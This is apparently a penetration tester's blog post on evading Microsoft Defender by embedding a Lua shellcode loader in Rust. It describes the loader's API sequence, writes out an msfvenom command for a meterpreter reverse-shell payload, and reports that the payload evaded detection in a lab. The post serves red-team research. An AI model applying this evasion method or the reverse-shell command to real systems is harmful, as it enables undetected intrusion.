# https://blog.shellntel.com/p/evading-microsoft-defender

<!DOCTYPE html><html lang="en" class="h-full antialiased"><body class="flex h-full flex-col bg-wt-background text-wt-text-on-background"><div class=""><div class="flex min-h-screen flex-col"><div></div><div data-rht-toaster="" style="position:fixed;z-index:9999;top:16px;left:16px;right:16px;bottom:16px;pointer-events:none"></div><main class="flex-grow"><div><div class="sticky top-0 z-50 w-full"><div aria-valuemax="100" aria-valuemin="0" aria-valuenow="0" aria-valuetext="0%" role="progressbar" data-state="loading" data-value="0" data-max="100" class="relative overflow-hidden h-1.5 bg-transparent w-full"><div data-state="loading" data-value="0" data-max="100" class="h-full w-full bg-wt-primary" style="width:0%"></div></div></div><div class="fixed bottom-0 left-0 z-50 px-4"></div><div class="relative mx-auto max-w-6xl px-4"><div class="fixed bottom-0 left-0 top-auto z-20 w-full rounded bg-wt-background shadow-xl transition-all duration-300 ease-in-out md:bottom-auto md:z-auto md:!w-fit md:border-none md:shadow-none opacity-100 md:top-20"><div class="absolute left-0 top-0 w-full border border-t border-wt-text-on-background bg-wt-background opacity-10 md:hidden"></div><div class="mx-auto w-full max-w-6xl px-0 lg:px-4"><div class="flex flex-col gap-8 md:h-40"><div class=""><div class="grid grid-cols-3 p-4 px-8 sm:p-2 sm:px-2 md:grid-cols-1 md:gap-2"><div class="relative flex flex-col justify-center md:left-1"><div class="flex h-7 w-7 items-center justify-center rounded-wt transition-all hover:bg-black/5"><button class="cursor-pointer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" data-slot="icon" class="h-6 w-6 stroke-1 text-wt-text-on-background opacity-50"><path stroke-linecap="round" stroke-linejoin="round" d="M10.5 19.5 3 12m0 0 7.5-7.5M3 12h18"></path></svg></button></div></div><div class="flex items-center justify-center gap-3 md:flex-col md:items-start md:gap-1"><button class="group" type="button"><div class="text-wt-text-on-background opacity-50 group-hover:opacity-100 flex items-center"><div class="rounded-full p-1 hover:bg-[#f3f4f6]"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-7 w-7 outline-none h-4 w-4 stroke-1"><path stroke-linecap="round" stroke-linejoin="round" d="M21 8.25c0-2.485-2.099-4.5-4.688-4.5-1.935 0-3.597 1.126-4.312 2.733-.715-1.607-2.377-2.733-4.313-2.733C5.1 3.75 3 5.765 3 8.25c0 7.22 9 12 9 12s9-4.78 9-12Z"></path></svg></div><span class="hidden text-transparent text-sm font-medium group-hover:opacity-100">0</span></div></button><div class="relative z-20 inline-block text-left md:z-0" data-headlessui-state=""><button class="relative right-[2px] top-[1.5px] outline-none md:right-[0px]" id="headlessui-menu-button-_R_3qlkl5_" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state=""><div class="flex items-center rounded-full p-1 hover:bg-[#f3f4f6]"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-wt-text-on-background opacity-50 hover:opacity-100 h-7 w-7 stroke-1 text-gray-400"><path stroke-linecap="round" stroke-linejoin="round" d="M7.217 10.907a2.25 2.25 0 1 0 0 2.186m0-2.186c.18.324.283.696.283 1.093s-.103.77-.283 1.093m0-2.186 9.566-5.314m-9.566 7.5 9.566 5.314m0 0a2.25 2.25 0 1 0 3.935 2.186 2.25 2.25 0 0 0-3.935-2.186Zm0-12.814a2.25 2.25 0 1 0 3.933-2.185 2.25 2.25 0 0 0-3.933 2.185Z"></path></svg></div></button></div></div></div></div></div></div></div><div class=""><div class="mx-auto flex max-w-2xl flex-col pb-4"><div class="mt-8" style="padding-left:15px;padding-right:15px"><ul class="flex flex-wrap items-center gap-2 text-xs font-semibold"><li class="flex items-center gap-2 text-wt-text-on-background"><a href="https://blog.shellntel.com/" class="opacity-70">#_shellntel Cybersecurity Blog</a><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" data-slot="icon" height="14px"><path stroke-linecap="round" stroke-linejoin="round" d="m8.25 4.5 7.5 7.5-7.5 7.5"></path></svg></li><li class="flex items-center gap-2 text-wt-text-on-background"><span class="opacity-70">Posts</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" data-slot="icon" height="14px"><path stroke-linecap="round" stroke-linejoin="round" d="m8.25 4.5 7.5 7.5-7.5 7.5"></path></svg></li><li class="flex items-center gap-2 text-wt-text-on-background"><span class="!opacity-100">Evading Microsoft Defender</span></li></ul></div><div><div><div><link href="https://fonts.gstatic.com/" rel="preconnect"><link href="https://fonts.googleapis.com/css2?family=Inter&amp;display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Inter&amp;display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Inter&amp;display=swap" rel="stylesheet"></div><div class="bg-wt-background" style="color: var(--wt-text-on-background-color) !important;"><div class="rendered-post" style="max-width: 672px; margin: 0 auto;"><div class="bg-wt-background text-wt-text-on-background"><div style="padding-top:1.5rem; padding-bottom:1.5rem;"><div id="web-header" style="padding-left: 15px; padding-right: 15px; color: var(--wt-text-on-background-color) !important; padding-bottom: 2rem;"><h1 style="font-size: 36px; font-family:'Trebuchet MS','Lucida Grande',Tahoma,sans-serif; line-height: 2.5rem; padding-bottom: 8px; font-weight: 700;">Evading Microsoft Defender</h1><h2 style="font-size: 20px; font-family:'Helvetica',Arial,sans-serif; line-height: 1.75rem; padding-bottom: 20px; font-weight: 400;">by Embedding Lua into Rust</h2><div class="bh__byline_wrapper"><div><div style="display:flex;"><div style="display:flex; flex-direction:row; justify-content:flex-start;"><div style="display:flex;"><img alt="Author" height="40" src="https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/user/profile_picture/58de0b6e-ba45-43ba-8b4b-3ee3e6cd294f/thumb_desktop-wallpaper-bully-scholarship.jpg" style="height:40px;width:40px;border:4px solid rgba(0,0,0,0);left:-4px;z-index:1;box-sizing:content-box;position:relative;border-radius:9999px;" width="40"></div><div style="display:flex; align-items:center;"><p style="left:8px;position:relative;font-family:'Helvetica',Arial,sans-serif;font-weight:normal;font-size:14px;color: var(--wt-text-on-background-color);margin:0px;line-height:20px;"><span><a href="https://blog.shellntel.com/authors/58de0b6e-ba45-43ba-8b4b-3ee3e6cd294f" target="_blank" style="color:var(--wt-text-on-background-color) !important;text-decoration:underline !important;">Dylan Reuter</a></span><br><span class="text-wt-text-on-background" style="opacity:0.75;"> July 30, 2024 </span></p></div></div></div></div><div class="bh__byline_social_wrapper"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fblog.shellntel.com%2Fp%2Fevading-microsoft-defender" target="_blank"><div style="max-width:28px;"><svg fill="none" height="100%" viewBox="0 0 212 212" width="100%" xmlns="http://www.w3.org/2000/svg"><circle cx="106.214" cy="105.5" fill-opacity="0.15" fill="#9CA3AF" r="105.5"></circle><path d="M96.9223 92.1778H87.0327V105.498H96.9223V145.461H113.405V105.498H125.273L126.591 92.1778H113.405V86.5165C113.405 83.5193 114.064 82.1873 117.031 82.1873H126.591V65.5364H114.064C102.197 65.5364 96.9223 70.8647 96.9223 80.8552V92.1778Z" fill="#BAC2CE"></path></svg></div></a><a href="https://twitter.com/intent/tweet?text=by+Embedding+Lua+into+Rust&amp;url=https%3A%2F%2Fblog.shellntel.com%2Fp%2Fevading-microsoft-defender" target="_blank"><div style="max-width:28px;"><svg fill="none" height="100%" viewBox="0 0 52 52" width="100%" xmlns="http://www.w3.org/2000/svg"><circle cx="26" cy="26" fill-opacity="0.15" fill="#9CA3AF" r="26"></circle><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" fill="#BAC2CE" transform="translate(14,14)"></path></svg></div></a><a href="https://www.threads.net/intent/post?text=by+Embedding+Lua+into+Rust+https%3A%2F%2Fblog.shellntel.com%2Fp%2Fevading-microsoft-defender" target="_blank"><div style="max-width:28px;"><svg fill="none" height="100%" viewBox="0 0 211 211" width="100%" xmlns="http://www.w3.org/2000/svg"><circle cx="105.5" cy="105.5" fill-opacity="0.15" fill="#9CA3AF" r="105.5"></circle><path d="M125.185 102.469C124.828 102.298 124.465 102.133 124.097 101.975C123.456 90.1702 117.006 83.4121 106.175 83.3429C106.126 83.3426 106.077 83.3426 106.028 83.3426C99.5502 83.3426 94.1624 86.1078 90.8463 91.1396L96.8028 95.2256C99.2801 91.4671 103.168 90.6658 106.031 90.6658C106.064 90.6658 106.097 90.6658 106.13 90.6661C109.696 90.6889 112.387 91.7257 114.129 93.7477C115.397 95.2198 116.244 97.254 116.664 99.8213C113.502 99.2839 110.083 99.1187 106.427 99.3283C96.13 99.9214 89.5101 105.927 89.9547 114.272C90.1803 118.505 92.2891 122.147 95.8924 124.526C98.9389 126.537 102.863 127.52 106.941 127.297C112.326 127.002 116.551 124.948 119.498 121.19C121.737 118.337 123.152 114.64 123.777 109.981C126.344 111.53 128.246 113.568 129.296 116.019C131.083 120.184 131.187 127.028 125.602 132.608C120.709 137.496 114.827 139.611 105.938 139.677C96.0779 139.603 88.6207 136.441 83.7723 130.278C79.2321 124.506 76.8857 116.17 76.7982 105.5C76.8857 94.8301 79.2321 86.4937 83.7723 80.7222C88.6207 74.5587 96.0778 71.3965 105.938 71.3232C115.87 71.3971 123.457 74.5745 128.491 80.7677C130.959 83.8048 132.82 87.6242 134.047 92.0775L141.028 90.2151C139.54 84.7337 137.2 80.0102 134.016 76.0929C127.563 68.1529 118.124 64.0844 105.962 64H105.914C93.777 64.0841 84.4441 68.1681 78.1742 76.1384C72.5949 83.2311 69.7169 93.1 69.6202 105.471L69.6199 105.5L69.6202 105.529C69.7169 117.9 72.5949 127.769 78.1742 134.862C84.4441 142.832 93.777 146.916 105.914 147H105.962C116.753 146.925 124.358 144.1 130.624 137.84C138.822 129.65 138.575 119.385 135.873 113.083C133.934 108.564 130.239 104.893 125.185 102.469ZM106.555 119.985C102.042 120.239 97.3533 118.213 97.1221 113.874C96.9507 110.657 99.4116 107.067 106.832 106.64C107.682 106.591 108.516 106.567 109.335 106.567C112.03 106.567 114.552 106.829 116.844 107.33C115.989 118.008 110.974 119.742 106.555 119.985Z" fill="#BAC2CE"></path></svg></div></a><a href="https://www.linkedin.com/sharing/share-offsite?url=https%3A%2F%2Fblog.shellntel.com%2Fp%2Fevading-microsoft-defender" target="_blank"><div style="max-width:28px;"><svg fill="none" height="100%" viewBox="0 0 211 211" width="100%" xmlns="http://www.w3.org/2000/svg"><circle cx="105.5" cy="105.5" fill-opacity="0.15" fill="#9CA3AF" r="105.5"></circle><path d="M82.1892 75.4698C82.1892 80.1362 78.526 83.8026 73.8638 83.8026C69.2015 83.8026 65.5383 80.1362 65.5383 75.4698C65.5383 70.8034 69.2015 67.137 73.8638 67.137C78.526 67.137 82.1892 70.8034 82.1892 75.4698ZM82.1892 90.4689H65.5383V143.799H82.1892V90.4689ZM108.831 90.4689H92.1797V143.799H108.831V115.801C108.831 100.135 128.812 98.8017 128.812 115.801V143.799H145.463V110.134C145.463 83.8026 115.824 84.8026 108.831 97.8018V90.4689Z" fill="#BAC2CE"></path></svg></div></a></div></div></div><div id="content-blocks"><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> I recently started learning about the world of game modding. I have always played games on a console, so modding was not something I ever pursued. However, after picking up the PC version of my favorite game, I discovered a world of interesting mods out there and it definitely piqued my interest. While I was perusing GitHub over the weekend and looking at the various mods available for the game, I noticed that they were all written in Lua. Now before becoming a penetration tester, I worked as a software engineer. So, learning about and dabbling with new programming languages has always been an interest of mine. </p></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> I had heard of Lua but didn’t know anything about it and had never used it in any capacity. Naturally, I started reading about the language and why it’s so popular in game modding. According to <a class="link" href="https://lua.org/?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">lua.org</a>: <i>Lua is a powerful, efficient, lightweight, embeddable scripting language. It supports procedural programming, object-oriented programming, functional programming, data-driven programming, and data description.</i> The fact that it is powerful, lightweight, and embeddable seem to be why it is a popular choice amongst game modders as well. Lua sounded pretty awesome to me, and I immediately started thinking about how it could be used in offensive development. Using “unpopular” programming languages is a proven tactic attackers have been using to help evade detection. </p></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"><a class="link" href="https://www.darkreading.com/threat-intelligence/attackers-use-of-uncommon-programming-languages-continues-to-grow?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">This article</a> from 2021 mentions how attackers are using Go, Nim, Rust, and DLang to bypass defenses. However, in 2024 I think it’s safe to say that Go, Nim, and Rust are all popular choices now (sorry DLang). Other examples of less popular programing languages used in modern malware are <a class="link" href="https://www.netskope.com/blog/new-darkgate-variant-uses-a-new-loading-approach?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">DarkGate</a> written in <a class="link" href="https://docwiki.embarcadero.com/RADStudio/Athens/en/Category:Delphi?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">Delphi</a>, and <a class="link" href="https://github.com/0xsp-SRD/mortar?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">Mortar</a> written in <a class="link" href="https://www.freepascal.org/docs.var?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">Pascal</a>. Anti-Virus software can have a more difficult time detecting malware in uncommon languages due to a lack of robust detection mechanisms for it. The lesser-used the language, the less likely it is that antivirus engines have developed a comprehensive database of known malware signatures and heuristics to use for detection. Offensive development is a great creative outlet. When it comes to AV evasion, thinking outside the box can go a long way in determining the success of your payload. Sometimes, the more weird or abstract and convoluted your payload is, the better. So, buckle up – things are going to get weird. </p></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> &nbsp;<b>Project Setup</b></p></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> So what we are going to do is create a basic shellcode loader in Lua and embed it into a Rust program. We will then create the same basic shellcode loader in Rust and see how they fair against each other in terms of detection. I chose Rust for this over something like C because I am a big fan of Rust for offensive development. I have written several other blog posts creating offensive tools using Rust, and I even gave a talk at SynerComm’s 2023 IT Summit on why it’s a great language for offensive development. In order to use Lua in our Rust project, we will use the <a class="link" href="https://github.com/mlua-rs/mlua?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">mlua</a> crate and add the features “vendored” and “luajit”. This will ensure our binary has everything it needs to execute our Lua code without needing Lua installed on the target machine. So, our Cargo.toml file will look like this: </p></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture1.png"></div></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> In our <a class="link" href="https://main.rs/?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">main.rs</a> file, we will use the handy “<i>include_bytes!” </i>macro to load our meterpreter shellcode which we will generate later, create our Lua instance, and load the FFI and BIT libraries. FFI is needed so we can use the WinAPI, and BIT is needed for the XOR decryption we will be performing on the shellcode. </p></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture2.png"></div></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> Next, we can call <i>lua.load() </i>where we will write all the Lua code we want to execute. The first thing we will do is call <i>ffi.cdef[[]] </i>where we will define all the Windows API functions and constants we want to use. We are just doing a basic shellcode loader, so we will use the following WinAPI functions: </p></div><div style="padding-bottom:12px;padding-left:37px;padding-right:27px;padding-top:12px;"><ul style="color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;list-style-type:disc;margin:0px 0px 0px 25px;padding:0;"><li style="margin:10px 0px 0px 0px;"><p style="text-align:left;"> VirtualAlloc </p></li><li style="margin:10px 0px 0px 0px;"><p style="text-align:left;"> VirtualProtect </p></li><li style="margin:10px 0px 0px 0px;"><p style="text-align:left;"> CreateThread </p></li><li style="margin:10px 0px 0px 0px;"><p style="text-align:left;"> WaitForSingleObject </p></li></ul></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> To make life easier and allow us to copy pasta the functions from MSDN, we can create type definitions of the C types to their Windows Types. E.g., unsigned long =&gt; DWORD. Our ffi.cdef will look like this: </p></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture3.png"></div></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> A really cool feature about embedding Lua is that we can pass variables from Rust to Lua and vice versa. We need to pass in our shellcode vector, and we can also pass in the shellcode length while we are at it. The Lua FFI <a class="link" href="https://luajit.org/ext_ffi_semantics.html?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">documentation</a> has some good tables showing the different Lua data types and their C equivalent. </p></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture4.png"></div></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"><a class="link" href="https://luajit.org/ext_ffi_semantics.htm?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">https://luajit.org/ext_ffi_semantics.htm</a></p></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> We will create a Lua table in Rust and add our shellcode and shellcode length to global variables that we can use in our Lua code. This all needs to go above our lua.load() method. </p></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture5.png"></div></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> Next, we will call <i>VirtualAlloc</i> to create space for our shellcode. We will also create the C buffer of type uint8 array that we will copy our shellcode into. <i>Note: the # preceding the variable name gets the length of the array.</i></p></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture6.png"></div></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> Now we will need to decrypt our shellcode and copy it into the address space we allocated with VirtualAlloc. We are not cutting any corners here so we will be encrypting our shellcode just like you would do in the real world. I generated MSF shellcode with the following command (adjust your LHOST as necessary): <i>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.2.99.1 LPORT=443 -f raw -o msfshellcode.bin EXITFUNC=thread</i> &nbsp; We will be encrypting our shellcode with XOR because we can decrypt it easily in our Lua program without needing any third-party crypto libraries. I recommend using this <a class="link" href="https://github.com/djackreuter/shellcode-encryption?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">shellcode-encryption</a> suite on a Windows machine to XOR the payload. Instead of a single byte XOR key, the <a class="link" href="https://xor.py/?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">xor.py</a> script uses a rotating key for enhanced security. In my case, I used “secretkey” and wrote it to the “src” directory of the Rust project. Be sure to copy the hex key that it prints. </p></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture7.png"></div></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> Next, we will decrypt our XOR’d shellcode, copy the shellcode into the C buffer, and copy the C buffer into the address space we created with VirtualAlloc. </p></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture8.png"></div></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> Those with a keen eye might have noticed some weirdness with the array indices. In Lua, the index starts at 1, but when using the ffi C array, the index starts at 0. &nbsp; Finally, we can call VirtualProtect to change the protections to PAGE_EXECUTE_READ, then kickoff our shellcode by calling CreateThread and WaitForSingleObject to wait indefinitely. On the Rust side of things, we can set a name for our Lua code block, which is handy if you are calling multiple, and call exec() to run it. The final piece will look like the following: </p></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture9.png"></div></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> Something interesting I think is worth mentioning here is the line: <i>local oldProtect = </i><i><a class="link" href="https://ffi.new/?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">ffi.new</a></i><i>(“DWORD[0]”)</i> The <a class="link" href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">VirtualProtect</a> function takes a pointer to a DWORD which will receive the old memory protection value. By creating this new DWORD as an array with 0 elements, we are essentially creating the DWORD pointer. </p></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> Now for the exciting part, the test! </p></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> For an equal comparison, I created the same basic shellcode injector in pure Rust. It follows the same simple injection method of: VirtualAlloc =&gt; XOR decrypt =&gt; Copy shellcode =&gt; VirtualProtect =&gt; CreateThread =&gt; WaitForSingleObject It also uses the same XOR’d meterpreter shellcode with the same decryption key. You can view that repository <a class="link" href="https://github.com/djackreuter/rustbaseline?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">here</a>. </p></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> For the lab setup, I am using <a class="link" href="https://docs.ludus.cloud/?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">Ludus</a> and have Metasploit running on a Kali machine and testing the payloads on a Windows 11 Enterprise machine with Real-time protection turned On and Automatic sample submission turned Off. PSA to always turn off Automatic sample submission! First, I tested the Rust Lua Loader and I was able to get a Meterpreter shell with no complaints from Defender. Pretty cool! </p></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture11.png"></div></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture12.png"></div></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> The pure Rust version, rust baseline, was a little disappointing. I could not even drop it to disk without it being detected. </p></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture13.png"></div></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p 